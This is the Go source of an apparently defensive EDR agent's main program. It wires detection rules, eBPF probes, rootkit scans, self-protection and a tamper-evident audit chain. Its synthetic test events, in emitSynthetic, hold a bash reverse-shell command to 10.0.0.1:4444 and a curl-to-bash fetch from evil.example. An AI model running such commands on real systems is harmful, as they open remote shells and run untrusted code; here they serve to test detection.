// Command edr-agent is the single-machine core. It wires the policy engine,
// the stateful sequence detector, the staged pipeline and the audit chain,
// and optionally collects events from CO-RE eBPF probes and the Rust datapath.
package main

import (
	"context"
	"crypto/ed25519"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	neturl "net/url"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"edr/internal/adminauth"
	"edr/internal/audit"
	"edr/internal/bpf"
	"edr/internal/center"
	"edr/internal/collect"
	"edr/internal/control"
	"edr/internal/datapath"
	"edr/internal/detect"
	"edr/internal/event"
	"edr/internal/integrity"
	"edr/internal/notify"
	"edr/internal/pipeline"
	"edr/internal/policy"
	"edr/internal/protect"
	"edr/internal/respond"
	"edr/internal/rootkit"
)

var version = "v2.0.0"

func main() {
	policyPath := flag.String("policy", "", "path to a policy JSON file (optional)")
	pubKeyPath := flag.String("pubkey", "", "Ed25519 public key; when set, the policy must be signed")
	once := flag.Bool("once", false, "emit synthetic events and exit")
	useBPF := flag.Bool("bpf", false, "collect from CO-RE eBPF probes (requires root)")
	selfProtect := flag.Bool("self-protect", false, "block signals/memory access targeting the agent (and counter-kill)")
	bpfGuard := flag.Bool("bpf-guard", false, "block tampering with the agent's own BPF objects (id-precise kprobe guard)")
	lsmLayer := flag.Bool("lsm", false, "attach the optional BPF-LSM enforcement layer (task_kill/ptrace) when the kernel supports it")
	strictModules := flag.Bool("strict-modules", false, "block non-agent kernel module loading (opt-in; only for hosts that never load modules at runtime)")
	selfCheckDir := flag.String("self-check-dir", "", "directory the self-integrity sentinel must keep seeing (e.g. /opt/edr)")
	dpSocket := flag.String("datapath-socket", "", "edr-datapath Unix socket for fanotify decisions")
	watchCSV := flag.String("watch", "", "comma-separated paths to observe with inotify (fallback)")
	enforce := flag.Bool("enforce", false, "actually execute response actions (default: dry-run)")
	quarantineDir := flag.String("quarantine-dir", "/var/lib/edr/quarantine", "quarantine directory")
	nftEnabled := flag.Bool("nft-enabled", false, "enable nftables network actions (nft_block/isolate)")
	nftTable := flag.String("nft-table", "edr", "nftables table name")
	nftChain := flag.String("nft-chain", "blocklist", "nftables chain name")
	eventPath := flag.String("event-path", "", "write the sealed event chain to this file (default: stdout)")
	anchorFile := flag.String("anchor-file", "", "file mirror for the chain-head anchor")
	anchorURL := flag.String("anchor-url", "", "HTTP endpoint for the chain-head anchor")
	anchorEvery := flag.Int("anchor-every", 5, "anchor push interval (seconds)")
	anchorSecretFile := flag.String("anchor-secret-file", "", "shared secret for a remote anchor (default: --center-secret-file)")
	auditKeyFile := flag.String("audit-key-file", "", "hex key enabling HMAC on the audit chain (recommended in production)")
	socketPath := flag.String("socket", "", "Unix socket for the control-plane API")
	allowedUIDs := flag.String("allowed-uids", "0", "comma-separated UIDs allowed on the control socket")
	adminKeyPath := flag.String("admin-key", "", "admin token key file (enables privileged actions)")
	centerURL := flag.String("center-url", "", "audit operations center ingest URL")
	centerSecret := flag.String("center-secret", "", "shared secret for center ingest")
	centerSecretFile := flag.String("center-secret-file", "", "read the center secret from this file (preferred)")
	hostOverride := flag.String("host", "", "override the host label stamped on events")
	masqScan := flag.Bool("masquerade-scan", true, "periodically scan for process masquerading (kworker etc.)")
	masqInterval := flag.Duration("masquerade-interval", 30*time.Second, "masquerade scan interval")
	rootkitScan := flag.Bool("rootkit-scan", true, "periodically run cross-source rootkit consistency checks (hidden proc/module/conn, syscall integrity)")
	rootkitInterval := flag.Duration("rootkit-interval", 60*time.Second, "rootkit scan interval")
	rootkitMinLife := flag.Duration("rootkit-min-lifetime", 10*time.Second, "min tracked lifetime before a PID can be flagged as hidden")
	rootkitConns := flag.Bool("rootkit-connections", false, "enable the /proc/net/tcp hidden-connection check (opt-in; can be noisy on busy hosts)")
	procRoot := flag.String("proc-root", "/proc", "procfs root for cross-source rootkit checks (testing/containers)")
	sysRoot := flag.String("sys-root", "/sys", "sysfs root for cross-source rootkit checks")
	notifyPath := flag.String("notify-config", "", "notification config (webhooks/syslog/email)")
	runFor := flag.Duration("run-for", 0, "stop after this duration (smoke tests); 0 = run until signal")
	flag.Parse()

	var pub ed25519.PublicKey
	if *pubKeyPath != "" {
		p, err := policy.LoadPublicKey(*pubKeyPath)
		if err != nil {
			fatal(fmt.Errorf("public key: %w", err))
		}
		pub = p
	}

	pol, err := loadPolicy(*policyPath, pub)
	if err != nil {
		fatal(err)
	}
	holder := detect.NewHolder(pol)

	host, _ := os.Hostname()
	if *hostOverride != "" {
		host = *hostOverride
	}

	// Anchor (external chain-head store) and chain continuity across restart.
	var anchor *audit.Anchor
	if *anchorFile != "" || *anchorURL != "" {
		url := *anchorURL
		if url != "" && !strings.Contains(url, "host=") {
			sep := "?"
			if strings.Contains(url, "?") {
				sep = "&"
			}
			url += sep + "host=" + neturl.QueryEscape(host)
		}
		var anchorSecret []byte
		secretPath := *anchorSecretFile
		if secretPath == "" {
			secretPath = *centerSecretFile
		}
		if secretPath != "" {
			raw, err := os.ReadFile(secretPath)
			if err != nil {
				fatal(fmt.Errorf("anchor secret: %w", err))
			}
			anchorSecret = []byte(strings.TrimSpace(string(raw)))
		}
		anchor = audit.NewAnchorWithOptions(audit.AnchorOptions{URL: url, FilePath: *anchorFile, Secret: anchorSecret})
	}
	var startHead audit.Head
	if anchor != nil {
		h, ok, err := anchor.FetchStrict()
		if err != nil {
			// Fail closed: a corrupted/unreadable anchor must not silently
			// downgrade the agent to a fresh chain.
			fatal(fmt.Errorf("anchor: %w (refusing to start a fresh chain)", err))
		}
		if ok {
			startHead = *h
		}
	}
	// Audit-chain HMAC key: when set, every event is HMAC'd so its content
	// cannot be forged without the key. Accepts hex (like events verify
	// --key-file). Minimum 16 bytes.
	var chainKey []byte
	if *auditKeyFile != "" {
		raw, err := os.ReadFile(*auditKeyFile)
		if err != nil {
			fatal(fmt.Errorf("audit-key-file: %w", err))
		}
		key, err := hex.DecodeString(strings.TrimSpace(string(raw)))
		if err != nil {
			fatal(fmt.Errorf("audit-key-file: not hex: %w", err))
		}
		if len(key) < 16 {
			fatal(fmt.Errorf("audit-key-file: key too short (%d bytes)", len(key)))
		}
		chainKey = key
	}
	chain := audit.NewChainAt(chainKey, startHead)

	sink := io.Writer(os.Stdout)
	if *eventPath != "" {
		fs, err := audit.NewFileSink(*eventPath, 1<<20, 3)
		if err != nil {
			fatal(fmt.Errorf("event sink: %w", err))
		}
		sink = fs
	}
	var forwarder *center.Forwarder
	var centerSec []byte
	if *centerURL != "" {
		centerSec = []byte(*centerSecret)
		if *centerSecretFile != "" {
			if raw, err := os.ReadFile(*centerSecretFile); err == nil {
				centerSec = []byte(strings.TrimSpace(string(raw)))
			} else {
				fatal(fmt.Errorf("center-secret-file: %w", err))
			}
		}
		forwarder = center.NewForwarder(*centerURL, centerSec, 2048)
		sink = center.MultiWriter{sink, forwarder}
	}

	// Enrichment fields follow the active rule set and are refreshed on reload.
	var ef atomic.Pointer[collect.Fields]
	computeFields := func() collect.Fields {
		need := holder.NeededFields()
		return collect.Fields{
			Cmdline:    need[policy.FieldCmdline],
			Environ:    need[policy.FieldEnviron],
			MapsLibs:   need[policy.FieldMapsLibs],
			Container:  need[policy.FieldContainerID],
			ParentName: need[policy.FieldParentName],
		}
	}
	f0 := computeFields()
	ef.Store(&f0)

	resp := &respond.Local{
		DryRun:        !*enforce,
		QuarantineDir: *quarantineDir,
		NFT:           respond.NFTProvider{Enabled: *nftEnabled, DryRun: !*enforce, Table: *nftTable, Chain: *nftChain},
	}

	var dispatcher *notify.Dispatcher
	if *notifyPath != "" {
		ncfg, err := notify.Load(*notifyPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "edr-agent: notify-config: %v (notifications disabled)\n", err)
		} else {
			dispatcher = notify.New(ncfg)
		}
	}

	// The rootkit tracker learns from raw events before detection so it sees
	// everything, including events that no rule matches (and are dropped later).
	tracker := rootkit.NewTracker()

	pipe := pipeline.New("agent", 512,
		hostStage{host: host},
		collect.EnrichStage{Provider: func() collect.Fields { return *ef.Load() }},
		learnStage{tr: tracker},
		detectStage{h: holder},
		respondStage{r: resp},
		auditStage{chain: chain, w: sink},
		notifyStage{d: dispatcher},
	)
	pipe.Start()
	defer pipe.Close()

	if *once {
		emitSynthetic(pipe)
		time.Sleep(80 * time.Millisecond)
		report(pipe, bpf.Stats{})
		return
	}

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()
	if *runFor > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, *runFor)
		defer cancel()
	}

	if anchor != nil {
		every := time.Duration(*anchorEvery) * time.Second
		if every <= 0 {
			every = 5 * time.Second
		}
		go func() {
			t := time.NewTicker(every)
			defer t.Stop()
			var lastWarn time.Time
			push := func() {
				if err := anchor.Push(chain.Head()); err != nil && time.Since(lastWarn) > time.Minute {
					lastWarn = time.Now()
					fmt.Fprintf(os.Stderr, "edr-agent: anchor push failed: %v\n", err)
				}
			}
			for {
				select {
				case <-ctx.Done():
					push()
					return
				case <-t.C:
					push()
				}
			}
		}()
	}

	if forwarder != nil {
		forwarder.Start(ctx)
		base := strings.TrimSuffix(*centerURL, "/v0/center/ingest")
		poller := center.NewActionPoller(base, host, centerSec, func(a center.ActionRequest) (bool, bool, string) {
			res := resp.Apply(respond.Request{
				Action: a.Action, PID: a.PID, Path: a.Path, Exe: a.Exe,
				StartTicks: a.StartTicks, RuleID: "orchestrated",
			})
			return res.Success, res.Enforced, res.Detail
		})
		poller.Start(ctx, 3*time.Second)
	}
	if dispatcher != nil {
		dispatcher.Start(ctx)
	}

	if *masqScan {
		go masqueradeLoop(ctx, pipe, host, *masqInterval)
	}
	if *rootkitScan {
		go rootkitLoop(ctx, pipe, host, tracker, *rootkitInterval, rootkit.Config{
			ProcRoot:    *procRoot,
			SysRoot:     *sysRoot,
			MinLifetime: *rootkitMinLife,
			Connections: *rootkitConns,
		})
	}

	var loader *bpf.Loader
	if *useBPF {
		loader, err = bpf.Load()
		if err != nil {
			fatal(fmt.Errorf("bpf: %w (need root and CONFIG_BPF_SYSCALL)", err))
		}
		defer func() { _ = loader.Close() }()
		loader.Start(ctx)
		go func() {
			for ev := range loader.Events() {
				ev := ev
				pipe.Submit(&ev)
			}
		}()
		if *selfProtect || *bpfGuard || *lsmLayer || *strictModules {
			if n, err := loader.RegisterOwnObjects(); err != nil {
				fmt.Fprintf(os.Stderr, "edr-agent: register own objects: %v\n", err)
			} else {
				fmt.Fprintf(os.Stderr, "edr-agent: self-protection on (registered %d own BPF objects)\n", n)
			}
			// Attach the LSM backstop BEFORE arming any guard, so there is never
			// an interval where the kprobe signal guard is armed but the LSM
			// hook (which covers paths the kprobe misses, e.g. tkill) is not.
			// The LSM stays inactive until SetGuardConfig mirrors the bits in.
			if *lsmLayer {
				if on, err := loader.EnableLSM(); err != nil {
					fmt.Fprintf(os.Stderr, "edr-agent: lsm layer unavailable: %v\n", err)
				} else if on {
					fmt.Fprintf(os.Stderr, "edr-agent: BPF-LSM layer attached (task_kill + ptrace_access_check)\n")
				} else {
					fmt.Fprintf(os.Stderr, "edr-agent: BPF-LSM not enabled on this kernel (kprobe path only)\n")
				}
			}
			// Set the identity after the LSM is attached so the mirror is
			// written through the error-checked path; still before arming.
			if err := loader.SetAgentPID(uint32(os.Getpid())); err != nil {
				fmt.Fprintf(os.Stderr, "edr-agent: set agent_pid: %v\n", err)
			}
			// Arm only the guards the operator asked for. Signal interception
			// backs both --self-protect and the LSM layer.
			var bits uint32
			if *selfProtect || *lsmLayer {
				bits |= bpf.GuardSignal
			}
			if *selfProtect {
				bits |= bpf.GuardCounterKill
			}
			if *bpfGuard {
				bits |= bpf.GuardBPFObject
			}
			if *strictModules {
				bits |= bpf.GuardModule
			}
			if err := loader.SetGuardConfig(bits); err != nil {
				fmt.Fprintf(os.Stderr, "edr-agent: arm guards: %v\n", err)
			} else {
				fmt.Fprintf(os.Stderr, "edr-agent: guards armed (signal=%v bpf_object=%v modules=%v kill=%v)\n",
					*selfProtect || *lsmLayer, *bpfGuard, *strictModules, *selfProtect)
			}
			go selfProtectLoop(ctx, loader, chain, sink, dispatcher, *selfCheckDir, *dpSocket)
		}
		// Always watch for dropped events: an attacker can flood the probes to
		// blind detection, and the operator must know when coverage degrades.
		go dropWatchLoop(ctx, pipe, loader, chain, sink, dispatcher)
	}

	if *watchCSV != "" {
		paths := splitCSV(*watchCSV)
		iw, err := collect.NewInotify(paths)
		if err != nil {
			fmt.Fprintf(os.Stderr, "edr-agent: inotify: %v\n", err)
		} else {
			defer func() { _ = iw.Close() }()
			iw.Start(ctx)
			go func() {
				for ev := range iw.Events() {
					ev := ev
					pipe.Submit(&ev)
				}
			}()
			fmt.Fprintf(os.Stderr, "edr-agent: inotify watching %d path(s)\n", len(paths))
		}
	}

	var dc *datapath.Client
	var policyVersion uint64 = 1
	if *dpSocket != "" {
		c, err := datapath.Dial(*dpSocket)
		if err != nil {
			fmt.Fprintf(os.Stderr, "edr-agent: datapath: %v\n", err)
		} else {
			dc = c
			defer func() { _ = dc.Close() }()
			resp.Datapath = dpKiller{c: dc}
			_ = dc.Hello(uint32(os.Getpid()))
			rules := datapath.CompileFileRules(pol)
			if err := dc.PushPolicy(policyVersion, rules); err != nil {
				fmt.Fprintf(os.Stderr, "edr-agent: datapath push policy: %v\n", err)
			}
			go func() {
				for ev := range dc.Events() {
					ev := ev
					pipe.Submit(&ev)
				}
			}()
			fmt.Fprintf(os.Stderr, "edr-agent: datapath connected (%d file deny rules)\n", len(rules))
		}
	}

	// Policy reload (shared by SIGHUP and the control-plane API).
	doReload := func() error {
		np, err := loadPolicy(*policyPath, pub)
		if err != nil {
			return err
		}
		holder.Reload(np)
		nf := computeFields()
		ef.Store(&nf)
		if dc != nil {
			policyVersion++
			if err := dc.PushPolicy(policyVersion, datapath.CompileFileRules(np)); err != nil {
				fmt.Fprintf(os.Stderr, "edr-agent: datapath push reloaded policy: %v\n", err)
			}
		}
		fmt.Fprintf(os.Stderr, "edr-agent: policy reloaded (%d rules, %d sequences)\n",
			holder.RuleCount(), len(np.Sequences))
		return nil
	}

	// Signed policy hot-reload on SIGHUP.
	hup := make(chan os.Signal, 4)
	signal.Notify(hup, syscall.SIGHUP)
	defer signal.Stop(hup)
	go func() {
		for range hup {
			if err := doReload(); err != nil {
				fmt.Fprintf(os.Stderr, "edr-agent: policy reload rejected: %v\n", err)
			}
		}
	}()

	// Control-plane API over a Unix socket.
	if *socketPath != "" {
		adminKey, err := adminauth.LoadOrCreateKey(*adminKeyPath)
		if err != nil {
			fatal(fmt.Errorf("admin key: %w", err))
		}
		statusFn := func() map[string]any {
			st := pipe.Stats()
			head := chain.Head()
			m := map[string]any{
				"agent_version":    version,
				"rules":            holder.RuleCount(),
				"sequences":        len(holder.Policy().Sequences),
				"chain_id":         head.ChainID,
				"chain_seq":        head.Seq,
				"pipeline_in":      st.In,
				"pipeline_out":     st.Out,
				"pipeline_dropped": st.Dropped,
			}
			if loader != nil {
				bs := loader.Stats()
				m["bpf_read"] = bs.Read
				m["bpf_dropped"] = bs.Dropped
				if *selfProtect {
					if v, err := loader.ReadHeartbeat(); err == nil {
						m["bpf_heartbeat"] = v
					}
					if pid, err := loader.ReadAgentPID(); err == nil {
						m["agent_pid_map"] = pid
					}
					m["self_protect"] = true
				}
			}
			return m
		}
		policyInfoFn := func() map[string]any {
			p := holder.Policy()
			return map[string]any{
				"schema_version": p.SchemaVersion,
				"rules":          len(p.Rules),
				"sequences":      len(p.Sequences),
			}
		}
		handler := control.New(control.Deps{
			AllowedUIDs:  parseInts(*allowedUIDs),
			Admin:        adminauth.New(adminKey),
			EventPath:    *eventPath,
			Status:       statusFn,
			PolicyInfo:   policyInfoFn,
			ReloadPolicy: doReload,
			Shutdown:     stop,
			NFTRollback:  func() any { return resp.NFT.Rollback() },
			QuarantineList: func() any {
				l, _ := resp.ListQuarantine()
				return l
			},
			QuarantineRestore: func(path string) any { return resp.RestoreQuarantine(path) },
			ExecuteResponse: func(action string, args map[string]any) any {
				req := respond.Request{Action: action}
				if v, ok := args["pid"].(int); ok {
					req.PID = v
				}
				if v, ok := args["path"].(string); ok {
					req.Path = v
				}
				if v, ok := args["remote_addr"].(string); ok {
					req.RemoteAddr = v
				}
				if v, ok := args["remote_port"].(int); ok {
					req.RemotePort = v
				}
				if v, ok := args["protocol"].(string); ok {
					req.Protocol = v
				}
				return resp.Apply(req)
			},
		})
		_ = os.MkdirAll(filepath.Dir(*socketPath), 0o750)
		_ = os.Remove(*socketPath)
		ln, err := net.Listen("unix", *socketPath)
		if err != nil {
			fatal(fmt.Errorf("control socket: %w", err))
		}
		if err := os.Chmod(*socketPath, 0o600); err != nil {
			fmt.Fprintf(os.Stderr, "edr-agent: chmod control socket: %v (SO_PEERCRED still enforces uid)\n", err)
		}
		httpSrv := &http.Server{Handler: handler.Handler(), ConnContext: control.ConnContext}
		go func() { _ = httpSrv.Serve(ln) }()
		defer func() { _ = httpSrv.Close() }()
		fmt.Fprintf(os.Stderr, "edr-agent: control plane on %s (admin_key=%v)\n", *socketPath, adminKey != nil)
	}

	fmt.Fprintf(os.Stderr, "edr-agent %s: %d rules, %d sequences, bpf=%v\n",
		version, holder.RuleCount(), len(pol.Sequences), *useBPF)

	<-ctx.Done()
	// Give the center forwarder a moment to flush its final batch.
	if forwarder != nil {
		time.Sleep(1200 * time.Millisecond)
	}
	pipe.Close()
	var bstat bpf.Stats
	if loader != nil {
		bstat = loader.Stats()
	}
	report(pipe, bstat)
}

func loadPolicy(path string, pub ed25519.PublicKey) (*policy.Policy, error) {
	if path == "" {
		return &policy.Policy{SchemaVersion: policy.SchemaVersion}, nil
	}
	if pub != nil {
		return policy.LoadSigned(path, pub)
	}
	return policy.LoadFile(path)
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, "edr-agent:", err)
	os.Exit(1)
}

func splitCSV(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if v := strings.TrimSpace(p); v != "" {
			out = append(out, v)
		}
	}
	return out
}

func parseInts(csv string) []int {
	var out []int
	for _, p := range splitCSV(csv) {
		if n, err := strconv.Atoi(p); err == nil {
			out = append(out, n)
		}
	}
	return out
}

func emitSynthetic(p *pipeline.Pipeline) {
	evs := []*event.Event{
		{
			Kind: event.KindExec, PID: 1001, Comm: "bash",
			Proc: &event.ProcInfo{
				Exe:     "/usr/bin/bash",
				Cmdline: []string{"bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
			},
		},
		{
			Kind: event.KindExec, PID: 1002, Comm: "curl",
			Proc: &event.ProcInfo{
				Exe:     "/usr/bin/curl",
				Cmdline: []string{"curl", "http://evil.example/p.sh", "|", "bash"},
			},
		},
		{
			Kind: event.KindFileOp, PID: 1003, Comm: "wget",
			File: &event.FileInfo{Path: "/tmp/dropper.sh", Op: "create", Mode: 0o755},
		},
		{Kind: event.KindConnect, PID: 1002, Net: &event.NetInfo{Protocol: "tcp", RemoteAddr: "10.0.0.1", RemotePort: 4444}},
	}
	for _, ev := range evs {
		p.Submit(ev)
	}
}

func report(p *pipeline.Pipeline, bs bpf.Stats) {
	st := p.Stats()
	fmt.Fprintf(os.Stderr, "edr-agent: in=%d out=%d dropped=%d urgent_dropped=%d errored=%d\n",
		st.In, st.Out, st.Dropped, st.UrgentDropped, st.Errored)
	fmt.Fprintf(os.Stderr, "edr-agent: bpf read=%d dropped=%d bad_rec=%d read_err=%d\n",
		bs.Read, bs.Dropped, bs.BadRec, bs.ReadErr)
	for name, s := range st.PerStage {
		fmt.Fprintf(os.Stderr, "  stage %-8s in=%d out=%d err=%d avg=%dns\n", name, s.In, s.Out, s.Errored, s.AvgNs)
	}
}

// detectStage runs the stateless rules and stateful sequences.
type detectStage struct{ h *detect.Holder }

func (s detectStage) Name() string { return "detect" }

func (s detectStage) Handle(ev *event.Event) (bool, error) {
	rules := s.h.Match(ev)
	seqs := s.h.Observe(ev)
	if len(rules) == 0 && len(seqs) == 0 {
		return false, nil
	}
	if ev.Detail == nil {
		ev.Detail = map[string]any{}
	}
	if len(rules) > 0 {
		ids := make([]string, 0, len(rules))
		for _, m := range rules {
			ids = append(ids, m.ID)
		}
		ev.Detail["matched_rules"] = ids
		if resp, auditRules := policy.AggregatedDecision(rules); resp != nil {
			ev.Detail["response_rule"] = resp.ID
			ev.Detail["response_action"] = resp.Action
			ev.Detail["severity"] = resp.Severity
		} else if len(auditRules) > 0 {
			ev.Detail["severity"] = auditRules[0].Severity
		}
	}
	if len(seqs) > 0 {
		ids := make([]string, 0, len(seqs))
		for _, q := range seqs {
			ids = append(ids, q.ID)
		}
		ev.Detail["sequence_rules"] = ids
		if _, ok := ev.Detail["severity"]; !ok {
			ev.Detail["severity"] = seqs[0].Severity
		}
	}
	return true, nil
}

// hostStage stamps the local hostname onto events before they are sealed, so
// the audit chain (and the center) can attribute every event to a host.
type hostStage struct{ host string }

func (s hostStage) Name() string { return "host" }

func (s hostStage) Handle(ev *event.Event) (bool, error) {
	if ev.Host == "" {
		ev.Host = s.host
	}
	return true, nil
}

// respondStage executes the response rule selected by the detect stage.
type respondStage struct{ r *respond.Local }

func (s respondStage) Name() string { return "respond" }

func (s respondStage) Handle(ev *event.Event) (bool, error) {
	if ev.Detail == nil {
		return true, nil
	}
	action, _ := ev.Detail["response_action"].(string)
	if action == "" || action == respond.ActionNone || action == respond.ActionLog {
		return true, nil
	}
	req := respond.Request{Action: action, PID: int(ev.PID)}
	if rule, ok := ev.Detail["response_rule"].(string); ok {
		req.RuleID = rule
	}
	if ev.Proc != nil {
		req.Exe = ev.Proc.Exe
		req.StartTicks = ev.Proc.StartTicks
	}
	if ev.File != nil {
		req.Path = ev.File.Path
	}
	if ev.Net != nil {
		req.Protocol = ev.Net.Protocol
		req.RemoteAddr = ev.Net.RemoteAddr
		req.RemotePort = int(ev.Net.RemotePort)
	}
	res := s.r.Apply(req)
	// Store a plain map, not the Result struct. The audit chain hashes the
	// event at seal time and re-verifies it after a JSON round-trip, which
	// turns nested structs into maps with alphabetically ordered keys. Keeping
	// a struct here changes the canonical bytes and breaks chain verification.
	ev.Detail["response_result"] = map[string]any{
		"action":   res.Action,
		"success":  res.Success,
		"enforced": res.Enforced,
		"detail":   res.Detail,
	}
	return true, nil
}

// dpKiller adapts the datapath client to respond.DatapathKiller.
type dpKiller struct{ c *datapath.Client }

func (k dpKiller) Kill(pid int, exe string, startTicks uint64) (bool, bool, string) {
	res, err := k.c.Kill(int32(pid), exe, startTicks)
	if err != nil {
		return false, false, err.Error()
	}
	return res.Success, res.Enforced, res.Detail
}

// masqueradeLoop periodically scans for processes claiming to be kernel
// threads and emits a detection event for each suspect.
func masqueradeLoop(ctx context.Context, pipe *pipeline.Pipeline, host string, interval time.Duration) {
	if interval <= 0 {
		interval = 30 * time.Second
	}
	t := time.NewTicker(interval)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
		}
		for _, f := range integrity.Scan() {
			ev := &event.Event{
				Kind: event.KindMasquerade, PID: uint32(f.PID), Comm: f.Comm, Host: host,
				Detail: map[string]any{"ppid": f.PPID, "exe": f.Exe, "reason": f.Reason},
			}
			ev.Normalize()
			pipe.Submit(ev)
			fmt.Fprintf(os.Stderr, "edr-agent: masquerade suspect pid=%d comm=%q ppid=%d exe=%q\n",
				f.PID, f.Comm, f.PPID, f.Exe)
		}
	}
}

// learnStage feeds the rootkit tracker from the raw event stream. It never
// drops events, so the tracker sees exec/fork/exit/connect regardless of
// whether any rule matches them.
type learnStage struct{ tr *rootkit.Tracker }

func (s learnStage) Name() string { return "learn" }

func (s learnStage) Handle(ev *event.Event) (bool, error) {
	if s.tr != nil {
		s.tr.Learn(ev)
	}
	return true, nil
}

// rootkitLoop periodically runs the cross-source consistency checks and emits
// one KindRootkit event per finding into the pipeline.
func rootkitLoop(ctx context.Context, pipe *pipeline.Pipeline, host string, tr *rootkit.Tracker, interval time.Duration, cfg rootkit.Config) {
	if interval <= 0 {
		interval = 60 * time.Second
	}
	if cfg.Grace <= 0 {
		cfg.Grace = interval * 3
	}
	det := rootkit.NewDetector(cfg, tr)
	t := time.NewTicker(interval)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
		}
		for _, ev := range det.RunOnce() {
			ev := ev
			ev.Host = host
			pipe.Submit(&ev)
			fmt.Fprintf(os.Stderr, "edr-agent: rootkit finding type=%v pid=%d detail=%v\n",
				ev.Detail["rootkit_type"], ev.PID, ev.Detail)
		}
	}
}

// selfProtectLoop periodically pokes a raw getpid() (to refresh the BPF
// heartbeat) and runs the sentinel; on failure it emits a signed SOS event.
func selfProtectLoop(ctx context.Context, loader *bpf.Loader, chain *audit.Chain, sink io.Writer, dispatcher *notify.Dispatcher, checkDir, dpSocket string) {
	bin, _ := os.Executable()
	sent := protect.NewSentinel(protect.Config{
		Reader:         loader,
		AgentPID:       uint32(os.Getpid()),
		BinaryPath:     bin,
		InstallDir:     checkDir,
		DatapathSocket: dpSocket,
	})
	t := time.NewTicker(2 * time.Second)
	defer t.Stop()
	stale := 0
	fired := false
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
		}
		// Refresh the BPF heartbeat with a raw getpid() syscall.
		_, _, _ = syscall.Syscall(syscall.SYS_GETPID, 0, 0, 0)
		ok, why := sent.Check()
		if ok {
			stale = 0
			continue
		}
		stale++
		// Debounce: require two consecutive failures to avoid transient alerts.
		if stale < 2 || fired {
			continue
		}
		fired = true
		fmt.Fprintf(os.Stderr, "edr-agent: SELF-PROTECTION ALERT: %s\n", why)
		emitSOS(chain, sink, dispatcher, why)
	}
}

// dropWatchLoop surfaces sensor degradation: if the pipeline or the BPF reader
// starts dropping events (e.g. an attacker floods the probes to hide activity),
// emit a critical self-protect event so coverage loss is never silent.
func dropWatchLoop(ctx context.Context, pipe *pipeline.Pipeline, loader *bpf.Loader, chain *audit.Chain, sink io.Writer, dispatcher *notify.Dispatcher) {
	t := time.NewTicker(5 * time.Second)
	defer t.Stop()
	var lastPipe, lastBPF uint64
	var lastWarn time.Time
	first := true
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
		}
		ps := pipe.Stats()
		bs := loader.Stats()
		pipeDrops := ps.Dropped + ps.UrgentDropped
		if first {
			lastPipe, lastBPF = pipeDrops, bs.Dropped
			first = false
			continue
		}
		dp := pipeDrops - lastPipe
		db := bs.Dropped - lastBPF
		lastPipe, lastBPF = pipeDrops, bs.Dropped
		if dp == 0 && db == 0 {
			continue
		}
		if time.Since(lastWarn) < time.Minute {
			continue
		}
		lastWarn = time.Now()
		reason := fmt.Sprintf("sensor degraded: pipeline_dropped+%d bpf_dropped+%d; detection may miss events", dp, db)
		fmt.Fprintf(os.Stderr, "edr-agent: %s\n", reason)
		emitSOS(chain, sink, dispatcher, reason)
	}
}

func emitSOS(chain *audit.Chain, sink io.Writer, dispatcher *notify.Dispatcher, reason string) {
	ev := &event.Event{
		Kind: event.KindSelfProtect,
		Detail: map[string]any{"sos": true, "reason": reason, "pid": os.Getpid(),
			"severity": "critical", "matched_rules": []string{"self-protect-sos"}},
	}
	ev.Normalize()
	line, err := chain.Seal(ev)
	if err == nil && sink != nil {
		_, _ = sink.Write(line)
	}
	if dispatcher != nil {
		dispatcher.Notify(ev)
	}
	fmt.Fprintf(os.Stderr, "\n!!! EDR SELF-PROTECTION SOS: %s !!!\n", reason)
}

// notifyStage dispatches matched events to the configured alert channels.
type notifyStage struct{ d *notify.Dispatcher }

func (s notifyStage) Name() string { return "notify" }

func (s notifyStage) Handle(ev *event.Event) (bool, error) {
	if s.d != nil {
		s.d.Notify(ev)
	}
	return true, nil
}

// auditStage seals the event into the hash chain and writes the JSONL line.
type auditStage struct {
	chain *audit.Chain
	w     io.Writer
}

func (s auditStage) Name() string { return "audit" }

func (s auditStage) Handle(ev *event.Event) (bool, error) {
	if s.chain == nil || s.w == nil {
		return true, nil
	}
	line, err := s.chain.Seal(ev)
	if err != nil {
		return false, err
	}
	_, err = s.w.Write(line)
	return true, err
}
